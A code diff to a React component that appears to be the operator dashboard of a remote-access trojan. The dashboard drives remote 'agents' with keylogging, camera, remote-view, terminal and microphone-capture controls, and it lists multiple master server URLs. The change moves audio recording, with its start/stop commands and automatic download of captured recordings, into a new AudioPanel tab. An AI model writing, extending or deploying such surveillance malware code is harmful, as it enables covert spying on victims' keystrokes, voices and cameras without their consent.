@@ -6,6 +6,7 @@ import KeylogPanel, { KeylogPanelHandle } from './KeylogPanel'
 import FileExplorer from './FileExplorer'
 import TerminalPane from './TerminalPane'
 import MastersPanel from './MastersPanel'
+import AudioPanel from './AudioPanel'
 
 type Agent = { agent_id: string; name: string; has_camera?: boolean }
 
@@ -43,8 +44,6 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
   const keylogRef = useRef<KeylogPanelHandle | null>(null)
   const [mastersOpen, setMastersOpen] = useState(false)
   const [masters, setMasters] = useState<Array<{ url: string; online?: boolean; current?: boolean }>>([])
-  const [audioRate, setAudioRate] = useState<number>(44100)
-  const [audioCh, setAudioCh] = useState<number>(1)
   const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || 'http://localhost:9000'
   const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
 
@@ -200,25 +199,6 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
     const n = (name || '').trim(); if (!n) return; dashboardSocket.setWallpaper(agent.agent_id, { path: n, style: wpStyle }); setLines((prev)=>[...prev, `[Wallpaper] request from file: ${n}`])
   }
 
-  const autoDownloadLatestAudio = async () => {
-    try {
-      const url = new URL(`${apiBase}/admin/history`)
-      url.searchParams.set('kind', 'audio')
-      url.searchParams.set('agent_id', agent.agent_id)
-      url.searchParams.set('limit', '1')
-      const r = await fetch(url.toString(), { headers: { Authorization: `Bearer ${token}` } })
-      const j = await r.json()
-      const it = Array.isArray(j?.items) && j.items.length ? j.items[0] : null
-      if (it && it.storage_url) {
-        const a = document.createElement('a')
-        a.href = `${apiBase}${it.storage_url}`
-        a.download = `audio-${(agent.name||agent.agent_id).replace(/[^\w\-\. ]+/g, '_')}-${Date.now()}.wav`
-        document.body.appendChild(a)
-        a.click()
-        a.remove()
-      }
-    } catch {}
-  }
 
   // Selection + clipboard
   const [selected, setSelected] = useState<Set<string>>(new Set())
@@ -273,15 +253,6 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
           <button className="btn secondary" onClick={refreshStats}>Refresh</button>
           <button className="btn secondary" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
-          <select className="input" value={audioRate} onChange={(e)=>setAudioRate(parseInt(e.target.value)||44100)} title="Sample rate">
-            {[8000,16000,22050,44100,48000].map((r)=>(<option key={r} value={r}>{r} Hz</option>))}
-          </select>
-          <select className="input" value={audioCh} onChange={(e)=>setAudioCh(parseInt(e.target.value)||1)} title="Channels">
-            <option value={1}>Mono</option>
-            <option value={2}>Stereo</option>
-          </select>
-          <button className="btn secondary" onClick={() => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_start', sample_rate: audioRate, channels: audioCh }); }}>Start Audio</button>
-          <button className="btn secondary" onClick={async () => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_stop' }); setTimeout(() => autoDownloadLatestAudio(), 1200); }}>Stop Audio</button>
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
           <button className="btn secondary" onClick={async () => { if (!keylogRunning) { dashboardSocket.startKeylog(agent.agent_id); setKeylogRunning(true); setShowKeylog(true); } else { dashboardSocket.stopKeylog(agent.agent_id); setKeylogRunning(false); try { await keylogRef.current?.exportAndSave() } catch {} } }}>{keylogRunning ? 'Stop Keylog' : 'Start Keylog'}</button>
           <button className="btn secondary" onClick={() => { setMastersOpen(true); dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' }) }}>Agent URLs</button>
@@ -336,6 +307,7 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
             <button className={`btn ${activeTab === 'terminal' ? '' : 'secondary'}`} onClick={() => setActiveTab('terminal')}>Terminal</button>
             <button className={`btn ${activeTab === 'remote' ? '' : 'secondary'}`} onClick={() => setActiveTab('remote')}>Remote View</button>
             <button className={`btn ${activeTab === 'camera' ? '' : 'secondary'}`} disabled={!((agent as any).has_camera === true)} onClick={() => setActiveTab('camera')}>Camera</button>
+            <button className={`btn ${activeTab === 'audio' ? '' : 'secondary'}`} onClick={() => setActiveTab('audio')}>Audio</button>
             {activeTab === 'terminal' && (
                 <div style={{ display: 'inline-flex', gap: 10, marginLeft: 'auto', alignItems: 'center' }}>
                 <div style={{ display: 'inline-flex', gap: 10, alignItems: 'center' }}>
@@ -393,6 +365,9 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
             )}
             {activeTab === 'camera' && (
               <CameraView agentId={agent.agent_id} agentName={agent.name} enabled={(agent as any).has_camera === true} onStarted={() => {}} />
+            )}
+            {activeTab === 'audio' && (
+              <AudioPanel agentId={agent.agent_id} agentName={agent.name} />
             )}
           </div>
         </main>
